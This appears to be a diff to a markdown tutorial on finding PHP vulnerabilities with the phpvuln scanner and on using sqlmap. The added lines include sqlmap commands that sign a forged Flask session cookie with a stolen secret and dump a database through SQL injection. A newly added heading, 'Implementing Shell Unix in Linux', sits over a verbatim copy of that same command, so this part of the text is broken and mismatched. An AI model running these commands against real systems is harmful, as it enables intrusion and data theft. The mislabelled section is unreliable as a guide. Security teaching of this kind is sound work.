@@ -2,8 +2,7 @@
 
 Hi, I'm Carl Vincent Reyno, a security engineer at HackerOne. Today I'm going to discuss how to find vulnerabilities in PHP code and how sqlmap works.
 
-So, According to the Zend (2023), A PHP vulnerability is an exploitable flaw in a PHP application that can be used to gain unauthorized access to systems that comprise or underlie that PHP application and further explaining it, PHPvuln is an open source OWASP penetration testing tool developed in Python 3 that may help you detect typical PHP vulnerabilities in PHP code, such as command injection, local/remote file inclusion, and SQL injection.
-
+So, According to the Zend (2023), A PHP vulnerability is an exploitable flaw in a PHP application that can be used to gain unauthorized access to systems that comprise or underlie that PHP application.
 
 Here's the dependencies on how to execute this in python3 pre-installed in your computer. 
 
@@ -18,11 +17,36 @@ git clone https://github.com/ecriminal/phpvuln.git
 cd phpvuln/
 python3 phpvuln.py -h
 ```
-![image](https://github.com/Eevalice/sqlmap-infosec-writeup/assets/79138019/52765652-0208-45c7-b011-7cedf905312a)
+
+<b> Getting the vulnerability list <b>
+Here you can see the list of many types of vulnerabilities that you can identify in php code with the help of this tool.
+```python
+python3 phpvuln.py --list-vuln
+```
+
+<b>Find Vulnerability</b>
+As you may have come to know about this tool why developers have created this tool. All we have to do is give the path of the php project that we want to investigate and it will identify all the vulnerability by itself.
+
+```python
+! python3 phpvuln.py -p < your path of php code >
+```
+```python
+python3 phpvuln.py -p .../.../Desktop/bWAPP/
+```
+
+Also you can use the following command if you want to find a specific vulnerability in PHP code.
+
+```python
+! python3 phpvuln.py -p < your path of php code > -v < vuln name >
+```
+
+```python
+python3 phpvuln.py -p /.../.../Desktop/bWAPP/ -v rfi
+```
+Thus, you can use all the features of this tool one by one and benefit by finding significant vulnerabilities in php code.
 
 
-
-
+<b> For the sqlmaps, we discuss on how php vuln works in the system using linux. Now we need to know how sqlmaps work</b>
 
 Here are the commands from `Generic.py` to generate basic arguments for sqlmap and to get a general idea about the topic:
 ```python
@@ -105,4 +129,11 @@ sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
 
 
 Sqlmap supports the usage of -e or --eval to process each payload before delivering it with a oneliner in Python. This makes customizing the payload before sending it very simple and quick. In the following example, flask signs the flask cookie session with the known secret before transmitting it:
+```python
+sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
+```
 
+<b> Implementing Shell Unix in Linux </b>
+```python
+sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
+```
